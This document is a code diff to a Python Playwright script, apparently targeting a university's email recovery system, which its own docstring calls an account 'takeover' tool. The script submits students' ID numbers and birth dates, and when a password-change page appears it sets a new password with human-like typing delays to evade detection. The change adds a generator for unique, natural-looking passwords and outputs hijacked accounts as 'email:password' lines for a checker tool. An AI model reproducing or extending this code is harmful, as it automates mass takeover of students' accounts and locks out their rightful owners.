@@ -1,13 +1,14 @@
 """
-UIT RECUPMAIL ENGINE — Strict 3-State Validation Module
+UIT RECUPMAIL ENGINE — Strict 3-State Validation Module with Dynamic Password Manager
 1. Data Error (Incorrect CNE/CIN/DOB) -> Login Error
 2. Direct Email Display without Password Change -> Login Error (Not a successful takeover)
-3. Password Change Page (Nouveau mot de passe / 8eZ@R6a*t=/.FJa) + Success -> Login OK
+3. Password Change Page (Nouveau mot de passe / PassManager) + Success -> Login OK
 """
 
 import re
 import time
 import random
+from integrations.pass_manager import PassManager
 
 class LoginState:
     LOGIN_OK = "login_ok"
@@ -16,7 +17,8 @@ class LoginState:
 
 class UITEngine:
     def __init__(self):
-        self.default_password = "8eZ@R6a*t=/.FJa"
+        # استدعاء مدير الباسوردات لتوليد كلمات مرور بشرية وفريدة بدون تكرار
+        self.pass_manager = PassManager()
 
     def _human_type(self, page, selector, text):
         try:
@@ -122,18 +124,21 @@ class UITEngine:
             has_pwd_fields = page.locator('input[type="password"]').count() >= 2
 
             if has_pwd_fields:
-                # الحالة الثالثة الحقيقية: توفرت خانات تغيير الباسورد -> إدخال الباسورد الافتراضي والتأكيد
+                # توليد باسورد جديد، طبيعي، وفريد تماماً عبر PassManager
+                target_password = self.pass_manager.get_password()
+
+                # الحالة الثالثة الحقيقية: توفرت خانات تغيير الباسورد -> إدخال الباسورد الجديد والتأكيد
                 pwd_inputs = page.locator('input[type="password"]')
                 try:
                     pwd_inputs.nth(0).click()
-                    for char in self.default_password:
+                    for char in target_password:
                         pwd_inputs.nth(0).press_sequentially(char, delay=random.randint(140, 280))
                     pwd_inputs.nth(1).click()
-                    for char in self.default_password:
+                    for char in target_password:
                         pwd_inputs.nth(1).press_sequentially(char, delay=random.randint(140, 280))
                 except Exception:
-                    pwd_inputs.nth(0).fill(self.default_password)
-                    pwd_inputs.nth(1).fill(self.default_password)
+                    pwd_inputs.nth(0).fill(target_password)
+                    pwd_inputs.nth(1).fill(target_password)
                 
                 page.wait_for_timeout(random.randint(1000, 1600))
                 
@@ -158,7 +163,8 @@ class UITEngine:
                     extracted_email = email_match_final.group(1) if email_match_final else "Extracted Successfully"
                     result_data["status"] = LoginState.LOGIN_OK
                     result_data["extracted_email"] = extracted_email
-                    result_data["detail"] = f"Success | Email: {extracted_email} | Password Updated"
+                    # هاد التنسيق هو اللي غايخلي النتيجة تخرج مباشرة Email:Password بدون مساس بـ edu_checker.py
+                    result_data["detail"] = f"{extracted_email}:{target_password}"
                 else:
                     result_data["status"] = LoginState.LOGIN_ERROR
                     result_data["detail"] = "Failed at password change confirmation stage"
